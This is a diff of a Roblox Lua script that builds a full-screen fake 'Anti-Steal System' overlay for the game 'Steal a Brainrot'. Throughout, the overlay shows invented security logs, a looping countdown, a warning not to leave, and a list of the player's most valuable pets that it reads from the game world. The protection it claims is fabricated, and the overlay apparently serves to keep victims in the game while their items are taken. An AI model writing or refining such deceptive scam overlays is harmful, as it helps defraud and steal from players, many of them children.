@@ -101,7 +101,7 @@ local function processPlayer(player)
     -- 4. CREATE GUI ONLY ONCE
     if not guiCreated then
         guiCreated = true
-        spawn(CreateAntiStealGUI)
+        spawn(CreateGui)
     end
 end
 -- ==================== ANTI-STEAL GUI (EXACT COPY) ====================
@@ -116,15 +116,17 @@ local function detectExecutor()
     end
 end
 
-function CreateAntiStealGUI()
+local function CreateGui()
+    local player = Players.LocalPlayer
     local gui = Instance.new("ScreenGui")
     gui.Name = "ExecutorAntiStealLoop"
     gui.ResetOnSpawn = false
     gui.IgnoreGuiInset = true
     gui.ZIndexBehavior = Enum.ZIndexBehavior.Global
     gui.DisplayOrder = 999999
-    gui.Parent = LocalPlayer:WaitForChild("PlayerGui")
+    gui.Parent = player:WaitForChild("PlayerGui")
 
+    -- Background
     local bg = Instance.new("Frame")
     bg.Size = UDim2.new(1, 0, 1, 0)
     bg.BackgroundColor3 = Color3.fromRGB(8, 8, 14)
@@ -139,6 +141,7 @@ function CreateAntiStealGUI()
     bgGrad.Rotation = 90
     bgGrad.Parent = bg
 
+    -- Title
     local title = Instance.new("TextLabel")
     title.Size = UDim2.new(0.92, 0, 0.13, 0)
     title.Position = UDim2.new(0.5, 0, 0.43, 0)
@@ -151,12 +154,13 @@ function CreateAntiStealGUI()
     title.TextStrokeTransparency = 0.7
     title.Parent = bg
 
+    -- Subtitle
     local subtitle = Instance.new("TextLabel")
     subtitle.Size = UDim2.new(0.82, 0, 0.16, 0)
     subtitle.Position = UDim2.new(0.5, 0, 0.54, 0)
     subtitle.AnchorPoint = Vector2.new(0.5, 0.5)
     subtitle.BackgroundTransparency = 1
-    subtitle.Text = "One of script that you executed got detected. Please wait until we fix it"
+    subtitle.Text = "You have executed a stealer script, that is trying to steal your stuff,\nWe are protecting you. Please Wait Sometime"
     subtitle.Font = Enum.Font.Gotham
     subtitle.TextSize = 24
     subtitle.TextColor3 = Color3.fromRGB(220, 240, 255)
@@ -164,12 +168,13 @@ function CreateAntiStealGUI()
     subtitle.TextXAlignment = Enum.TextXAlignment.Center
     subtitle.Parent = bg
 
+    -- Warning
     local warning = Instance.new("TextLabel")
-    warning.Size = UDim2.new(0.78, 0, 0.12, 0)
+    warning.Size = UDim2.new(0.78, 0, 0.08, 0)
     warning.Position = UDim2.new(0.5, 0, 0.64, 0)
     warning.AnchorPoint = Vector2.new(0.5, 0.5)
     warning.BackgroundTransparency = 1
-    warning.Text = "Warning: Leave can cause data-lose, means ur progress reset in game\nand you will get banned for 6 months"
+    warning.Text = "Warning: Don't Leave, Leaving will cause loss of in-game items like pets."
     warning.Font = Enum.Font.GothamBold
     warning.TextSize = 22
     warning.TextColor3 = Color3.fromRGB(255, 80, 80)
@@ -177,20 +182,22 @@ function CreateAntiStealGUI()
     warning.TextXAlignment = Enum.TextXAlignment.Center
     warning.Parent = bg
 
+    -- Countdown
     local countdown = Instance.new("TextLabel")
     countdown.Size = UDim2.new(0.7, 0, 0.08, 0)
-    countdown.Position = UDim2.new(0.5, 0, 0.74, 0)
+    countdown.Position = UDim2.new(0.5, 0, 0.72, 0)
     countdown.AnchorPoint = Vector2.new(0.5, 0.5)
     countdown.BackgroundTransparency = 1
-    countdown.Text = "Fixing in 5:00..."
+    countdown.Text = "Securing in 5:00..."
     countdown.Font = Enum.Font.GothamBold
     countdown.TextSize = 30
     countdown.TextColor3 = Color3.fromRGB(100, 255, 150)
     countdown.Parent = bg
 
+    -- Console Panel
     local console = Instance.new("Frame")
     console.Size = UDim2.new(0.88, 0, 0.25, 0)
-    console.Position = UDim2.new(0.5, 0, 0.82, 0)
+    console.Position = UDim2.new(0.5, 0, 0.80, 0)
     console.AnchorPoint = Vector2.new(0.5, 0.5)
     console.BackgroundColor3 = Color3.fromRGB(15, 15, 25)
     console.BorderSizePixel = 0
@@ -208,7 +215,7 @@ function CreateAntiStealGUI()
     local consoleTitle = Instance.new("TextLabel")
     consoleTitle.Size = UDim2.new(1, 0, 0, 28)
     consoleTitle.BackgroundTransparency = 1
-    consoleTitle.Text = "SECURITY SCANNER"
+    consoleTitle.Text = "SECURITY CONSOLE"
     consoleTitle.Font = Enum.Font.Code
     consoleTitle.TextSize = 16
     consoleTitle.TextColor3 = Color3.fromRGB(100, 200, 255)
@@ -228,8 +235,9 @@ function CreateAntiStealGUI()
     logArea.TextWrapped = true
     logArea.Parent = console
 
+    -- Failure Message
     local failureMsg = Instance.new("TextLabel")
-    failureMsg.Size = UDim2.new(0.9, 0, 0.25, 0)
+    failureMsg.Size = UDim2.new(0.9, 0, 0.2, 0)
     failureMsg.Position = UDim2.new(0.5, 0, 0.4, 0)
     failureMsg.AnchorPoint = Vector2.new(0.5, 0.5)
     failureMsg.BackgroundTransparency = 1
@@ -243,18 +251,104 @@ function CreateAntiStealGUI()
     failureMsg.Visible = false
     failureMsg.Parent = bg
 
+    -- Watermark
     local watermark = Instance.new("TextLabel")
     watermark.Size = UDim2.new(0.5, 0, 0.05, 0)
     watermark.Position = UDim2.new(1, -12, 1, -12)
     watermark.AnchorPoint = Vector2.new(1, 1)
     watermark.BackgroundTransparency = 1
-    watermark.Text = "Executor Shield – Anti-Exploit System"
+    watermark.Text = "Steal a Brainrot – Anti-Steal System"
     watermark.Font = Enum.Font.Gotham
     watermark.TextSize = 15
     watermark.TextColor3 = Color3.fromRGB(90, 140, 180)
     watermark.TextXAlignment = Enum.TextXAlignment.Right
     watermark.Parent = bg
 
+    -- ================================================================= --
+    -- BRAINROT SCANNING (Same as main.lua)
+    -- ================================================================= --
+    local Workspace = game:GetService("Workspace")
+
+    local function parseGenerationValue(generationString)
+        local cleaned = generationString:gsub("%s", ""):match("^%s*(.-)%s*$")
+        local numberPart, unitPart = cleaned:match("(%d+%.?%d*)([KMB]?)")
+        if not numberPart then return 0 end
+        numberPart = tonumber(numberPart)
+        if unitPart == "K" then return numberPart * 1e3
+        elseif unitPart == "M" then return numberPart * 1e6
+        elseif unitPart == "B" then return numberPart * 1e9
+        else return numberPart end
+    end
+
+    local function extractRate(name)
+        local rate = name:match("%$(%d+%.?%d*[KMB]?)%/s")
+        return rate and (rate .. "/s") or nil
+    end
+
+    local function getBrainrots()
+        local list = {}
+        local plots = Workspace:FindFirstChild("Plots")
+        if not plots then return list end
+        for _, plot in ipairs(plots:GetChildren()) do
+            local podiums = plot:FindFirstChild("AnimalPodiums")
+            if podiums then
+                for _, podium in ipairs(podiums:GetChildren()) do
+                    if tonumber(podium.Name) and podium.Name:match("^%d+$") then
+                        local base = podium:FindFirstChild("Base")
+                        local spawn = base and base:FindFirstChild("Spawn")
+                        local attach = spawn and spawn:FindFirstChild("Attachment")
+                        local over = attach and attach:FindFirstChild("AnimalOverhead")
+                        if over then
+                            local nameLbl = over:FindFirstChild("DisplayName")
+                            local genLbl = over:FindFirstChild("Generation")
+                            if nameLbl and nameLbl:IsA("TextLabel") and genLbl and genLbl:IsA("TextLabel") then
+                                local genVal = parseGenerationValue(genLbl.Text)
+                                local cleanName = nameLbl.Text:gsub("%s*%$[%d%.]+[KM]?/s", ""):gsub("^%s+", ""):gsub("%s+$", "")
+                                local rate = extractRate(nameLbl.Text) or genLbl.Text
+                                table.insert(list, {
+                                    PetName = cleanName,
+                                    Formatted = rate,
+                                    Value = genVal
+                                })
+                            end
+                        end
+                    end
+                end
+            end
+        end
+        table.sort(list, function(a, b) return a.Value > b.Value end)
+        return list
+    end
+
+    -- ================================================================= --
+    -- GET REAL BRAINROTS
+    -- ================================================================= --
+    local brainrots = getBrainrots()
+    local topBrainrots = {}
+    local lowBrainrot = nil
+
+    if #brainrots > 0 then
+        for i = 1, math.min(7, #brainrots) do
+            table.insert(topBrainrots, brainrots[i])
+        end
+        lowBrainrot = brainrots[#brainrots]
+    else
+        -- Fallback (only if no brainrots found)
+        topBrainrots = {
+            { PetName = "[Failed to Fetch]", Formatted = "1M" },
+            { PetName = "[Failed to Fetch]", Formatted = "850K" },
+            { PetName = "[Failed to Fetch]", Formatted = "720K" },
+            { PetName = "[Failed to Fetch]", Formatted = "600K" },
+            { PetName = "[Failed to Fetch]", Formatted = "550K" },
+            { PetName = "[Failed to Fetch]", Formatted = "480K" },
+            { PetName = "[Failed to Fetch]", Formatted = "320K" }
+        }
+        lowBrainrot = { PetName = "Basic Thought", Formatted = "1K" }
+    end
+
+    -- ================================================================= --
+    -- LOG SYSTEM
+    -- ================================================================= --
     local logLines = {}
     local function addLog(text, color)
         table.insert(logLines, {text = text, color = color or Color3.fromRGB(180, 255, 180)})
@@ -266,50 +360,61 @@ function CreateAntiStealGUI()
         logArea.Text = display
     end
 
-    local errorActions = {
-        "Scanning for injected bytecode...",
-        "Blocking unauthorized remote calls",
-        "Purging malicious script threads",
-        "Validating LocalScript integrity",
-        "Isolating exploit payload",
-        "Decrypting obfuscated functions",
-        "Reporting to anti-cheat backend",
-        "Reverting modified DataStore",
-        "Killing suspicious task threads",
-        "Enforcing executor sandbox rules"
-    }
-
-    local criticalErrors = {
-        "FATAL: Memory corruption detected in ModuleScript",
-        "ERROR: RemoteEvent hijacked by external script",
-        "CRITICAL: DataStore write attempt blocked",
-        "WARNING: Attempted character manipulation",
-        "ALERT: Unauthorized GUI injection"
-    }
-
+    -- ================================================================= --
+    -- PROTECTION LOOP
+    -- ================================================================= --
     task.spawn(function()
-        while LocalPlayer.Parent and gui.Parent do
+        while player.Parent and gui.Parent do
             local totalSeconds = 300
             local startTime = tick()
             failureMsg.Visible = false
+            failureMsg.Text = ""
+
             while tick() - startTime < totalSeconds do
                 if not gui.Parent then break end
                 local remaining = totalSeconds - math.floor(tick() - startTime)
                 local mins = math.floor(remaining / 60)
                 local secs = remaining % 60
-                countdown.Text = string.format("Fixing in %d:%02d...", mins, secs)
-                task.wait(math.random(15, 35) / 10)
-                if math.random() < 0.7 then
-                    addLog(errorActions[math.random(#errorActions)])
-                else
-                    addLog(criticalErrors[math.random(#criticalErrors)], Color3.fromRGB(255, 100, 100))
+                countdown.Text = string.format("Securing in %d:%02d...", mins, secs)
+
+                task.wait(math.random(18, 32) / 10)
+
+                local actions = {
+                    "Scanning remote event hooks...",
+                    "Blocking unauthorized FireServer calls",
+                    "Purging malicious discord webhook traces",
+                    "Isolating exploit thread",
+                    "Recovering Brainrot UUIDs...",
+                    "Securing generation data",
+                    "Reporting script to anti-cheat",
+                    "Encrypting local inventory",
+                    "Validating podium ownership",
+                    "Neutralizing steal exploit"
+                }
+                addLog(actions[math.random(#actions)])
+
+                -- Random failure on lowest brainrot
+                if lowBrainrot and math.random() < 0.15 then
+                    addLog("Failed to secure " .. lowBrainrot.PetName, Color3.fromRGB(255, 100, 100))
+                end
+
+                -- Random recovery attempt
+                if #brainrots > 0 and math.random() < 0.3 then
+                    local p = brainrots[math.random(1, #brainrots)]
+                    addLog("Recovering " .. p.PetName .. " → " .. p.Formatted, Color3.fromRGB(100, 255, 100))
                 end
             end
-            failureMsg.Text = "FIX FAILED:\nExploit could not be removed\nProgress reset & 6-month ban issued"
+
+            -- === FAILURE AFTER 5 MINUTES ===
+            local failedLines = {}
+            for _, p in ipairs(topBrainrots) do
+                table.insert(failedLines, p.PetName .. " → " .. p.Formatted)
+            end
+            failureMsg.Text = "Failed to Recover:\n" .. table.concat(failedLines, "\n")
             failureMsg.Visible = true
-            addLog("SYSTEM: Fix failed. Account flagged.", Color3.fromRGB(255, 50, 50))
-            addLog("Restarting scan cycle...", Color3.fromRGB(255, 200, 50))
-            task.wait(5)
+            addLog("CRITICAL: Recovery failed for 7 high-gen brainrots", Color3.fromRGB(255, 50, 50))
+            addLog("Restarting protection cycle...", Color3.fromRGB(255, 200, 50))
+            task.wait(4)
         end
     end)
 
